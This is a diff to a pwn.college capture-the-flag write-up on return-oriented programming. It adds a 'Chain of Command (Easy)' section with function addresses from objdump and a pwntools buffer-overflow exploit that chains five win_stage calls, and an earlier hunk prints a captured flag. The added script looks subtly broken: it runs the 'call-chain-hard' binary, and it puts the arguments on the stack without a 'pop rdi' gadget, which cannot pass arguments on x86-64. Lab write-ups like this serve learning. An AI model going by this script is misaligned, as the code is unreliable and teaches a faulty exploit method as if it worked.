@@ -373,7 +373,9 @@ hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /chall
 
 If we overwrite the return address with the address of `win_stage_1` and place the address of `win_stage_2` after it, when the program returns from `win_stage_1`, it will execute `win_stage_2`, thus chaining our attack for us. 
 
-```py
+### Exploit
+
+```py title="~/script.py" showLineNumbers
 from pwn import *
 
 # Initialize required values
@@ -676,4 +678,121 @@ hacker@return-oriented-programming~call-chain-hard:/$ python ~/script.py
 
 Leaving!
 pwn.college{kUbPQlmZDS13sRzrmbin50xWwe_.0FN0MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Chain of Command (Easy)
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ /challenge/chain-of-command-easy 
+###
+### Welcome to /challenge/chain-of-command-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
+In order to get the flag, you will need to call all of these stages in order.
+
+In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
+you pass will be the stage number. For instance, `win_stage_1(1)`.
+
+You can call a function by directly overflowing into the saved return address,
+which is stored at 0x7ffcd79c2e68, 120 bytes after the start of your input buffer.
+That means that you will need to input at least 128 bytes (101 to fill the buffer,
+19 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+```
+
+### `win_stage_1()`
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_1>:"
+00000000004028ba <win_stage_1>:
+```
+
+### `win_stage_2()`
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_2>:"
+0000000000402615 <win_stage_2>:
+```
+
+### `win_stage_3()`
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_3>:"
+00000000004026f5 <win_stage_3>:
+```
+
+### `win_stage_4()`
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_4>:"
+000000000040252f <win_stage_4>:
+```
+
+### `win_stage_5()`
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_5>:"
+00000000004027d7 <win_stage_5>:
+```
+
+### Exploit
+
+```py
+from pwn import *
+
+# Initialize required values
+win_stage_1_offset = 0x4028ba
+win_stage_1_arg = 1
+win_stage_2_offset = 0x402615
+win_stage_2_arg = 2
+win_stage_3_offset = 0x4026f5
+win_stage_3_arg = 3
+win_stage_4_offset = 0x40252f
+win_stage_4_arg = 4
+win_stage_5_offset = 0x4027d7
+win_stage_5_arg = 5
+
+# Calculate offset
+offset = 120
+
+# Craft payload
+payload = b"A" * offset
+payload += p64(win_stage_1_offset)
+payload += p64(win_stage_1_arg)
+payload += p64(win_stage_2_offset)
+payload += p64(win_stage_2_arg)
+payload += p64(win_stage_3_offset)
+payload += p64(win_stage_3_arg)
+payload += p64(win_stage_4_offset)
+payload += p64(win_stage_4_arg)
+payload += p64(win_stage_5_offset)
+payload += p64(win_stage_5_arg)
+
+attempt = 0
+
+while True:
+    attempt += 1
+    print(f"[+] Attempt {attempt}")
+
+    p = process('/challenge/call-chain-hard')
+    try:
+        p.recvuntil("and 8 that will overwrite the return address).")
+        p.send(payload)
+        output = p.recvall(timeout=1).decode(errors="ignore")
+
+        if "pwn.college{" in output:
+            print("[!!!] FLAG FOUND !!!")
+            print(output)
+            break
+
+    except Exception:
+        pass
+    finally:
+        p.close()
 ```
